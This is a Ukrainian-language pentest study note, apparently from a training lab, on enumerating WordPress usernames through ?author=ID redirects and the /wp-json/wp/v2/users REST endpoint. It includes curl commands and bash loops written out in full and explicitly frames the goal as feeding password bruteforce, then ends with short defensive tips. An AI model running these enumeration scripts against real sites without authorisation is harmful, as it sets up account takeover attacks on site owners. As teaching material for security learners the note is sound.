# User Enumeration

## 🎯 Ціль

Отримати список валідних користувачів WordPress (логіни), щоб далі:
- підбирати паролі (bruteforce),
- шукати дефолтні креденшіали,
- атакувати конкретні акаунти (admin, editor тощо).

---

## 🥇 Метод 1 — `?author=ID` (редіректи)

### Ідея

WordPress мапить `author ID` на публічний профіль користувача.

Якщо користувач існує:
- запит з `?author=ID` повертає `301 Moved Permanently`,
- у `Location` видно username (наприклад, `/author/admin/`).

Якщо не існує:
- повертається `404 Not Found`.

### Приклад — існуючий користувач

```bash
curl -s -I "http://blog.inlanefreight.com/?author=1"
Важливі заголовки у відповіді:

text
HTTP/1.1 301 Moved Permanently
Location: http://blog.inlanefreight.com/index.php/author/admin/
→ user ID 1 відповідає користувачу admin.

Приклад — неіснуючий користувач
bash
curl -s -I "http://blog.inlanefreight.com/?author=100"
Отримуємо:

text
HTTP/1.1 404 Not Found
→ користувач з ID 100 не існує.

Швидка автоматизація
bash
TARGET="http://blog.inlanefreight.com"

for i in $(seq 1 10); do
  echo -n "[*] ID $i -> "
  curl -s -I "$TARGET/?author=$i" | grep -i ^Location || echo "no user"
done
🥈 Метод 2 — JSON endpoint (/wp-json/wp/v2/users)
Ідея
WordPress REST API дозволяє отримати інформацію про користувачів.

bash
curl "http://blog.inlanefreight.com/wp-json/wp/v2/users" | jq
Приклад відповіді:

json
[
  {
    "id": 1,
    "name": "admin",
    "link": "http://blog.inlanefreight.com/index.php/author/admin/"
  },
  {
    "id": 2,
    "name": "ch4p",
    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/"
  }
]
→ Користувач з ID 2 має ім’я ch4p.

У нових версіях WP API може показувати не всіх користувачів, а лише тих, хто публікував пости.

🚀 Швидкий чекліст
bash
# 1. Перевірити author-based enum
curl -s -I "$TARGET/?author=1"
curl -s -I "$TARGET/?author=2"

# 2. Автоматизувати author → username
for i in $(seq 1 20); do
  curl -s -I "$TARGET/?author=$i" | grep -i Location
done

# 3. REST API users
curl "$TARGET/wp-json/wp/v2/users" | jq
🛡️ Захист від user enumeration
Додати редірект або 404 для /?author=ID.

Обмежити/фільтрувати доступ до /wp-json/wp/v2/users.

Використовувати плагіни, що ховають інформацію про користувачів.
